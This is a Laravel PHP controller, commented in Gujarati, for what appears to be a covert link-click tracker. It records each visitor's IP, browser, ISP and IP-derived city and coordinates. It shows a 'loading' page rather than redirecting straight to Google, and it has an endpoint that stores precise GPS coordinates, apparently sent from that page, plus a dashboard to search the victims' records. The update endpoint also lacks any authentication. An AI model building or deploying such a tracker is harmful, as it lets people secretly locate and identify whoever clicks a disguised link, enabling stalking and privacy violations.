<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Stevebauman\Location\Facades\Location;

class TrackController extends Controller
{
    public function track(Request $request)
    {
        // ૧. IP મેળવવો
        $ip = $request->ip();

        // ૨. IP-બેઝ લોકેશન (મોટા શહેરનું લોકેશન)
        $locationData = Location::get($ip);

        // ૩. ISP મેળવવા માટે API કોલ (Timeout સાથે)
        $ispName = 'Unknown';
        try {
            $response = Http::timeout(3)->get("http://ip-api.com/json/{$ip}?fields=isp");
            if ($response->successful()) {
                $ispName = $response->json('isp', 'Unknown');
            }
        } catch (\Exception $e) {
            $ispName = 'Unknown';
        }

        // ૪. ડેટાબેઝમાં એન્ટ્રી કરવી અને ID મેળવવો
        $id = DB::table('clicks')->insertGetId([
            'ip'         => $ip,
            'device'     => $request->header('User-Agent'),
            'isp'        => $ispName,
            'city'       => $locationData->cityName ?? 'Unknown',
            'country'    => $locationData->countryName ?? 'Unknown',
            'latitude'   => $locationData->latitude ?? null, // IP મુજબનું લેટિટ્યુડ
            'longitude'  => $locationData->longitude ?? null, // IP મુજબનું લોન્ગીટ્યુડ
            'clicked_at' => now(),
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        // ૫. સીધું ગૂગલ પર જવાને બદલે loading પેજ બતાવો
        return view('loading', ['id' => $id]);
    }

    // GPS ડેટા અપડેટ કરવા માટેની નવી મેથડ
    public function updateLocation(Request $request)
    {
        DB::table('clicks')
            ->where('id', $request->id)
            ->update([
                'latitude' => $request->latitude,
                'longitude' => $request->longitude,
                'updated_at' => now(),
            ]);

        return response()->json(['status' => 'success']);
    }

    public function dashboard(Request $request)
    {
        $search = $request->input('search');
        $query = DB::table('clicks');

        if (!empty($search)) {
            $query->where(function($q) use ($search) {
                $q->where('ip', 'LIKE', "%$search%")
                  ->orWhere('city', 'LIKE', "%$search%")
                  ->orWhere('country', 'LIKE', "%$search%")
                  ->orWhere('isp', 'LIKE', "%$search%"); 
            });
        }

        // Pagination વાપરવું વધુ સારું છે
        $data = $query->orderBy('clicked_at', 'desc')->paginate(20);
        return view('dashboard', compact('data'));
    }

    public function destroy($id)
    {
        DB::table('clicks')->where('id', $id)->delete();
        return back()->with('success', 'રેકોર્ડ ડિલીટ થઈ ગયો!');
    }

    public function destroyAll()
    {
        DB::table('clicks')->delete(); 
        return back()->with('success', 'બધો જ ડેટા ડિલીટ થઈ ગયો!');
    }
}
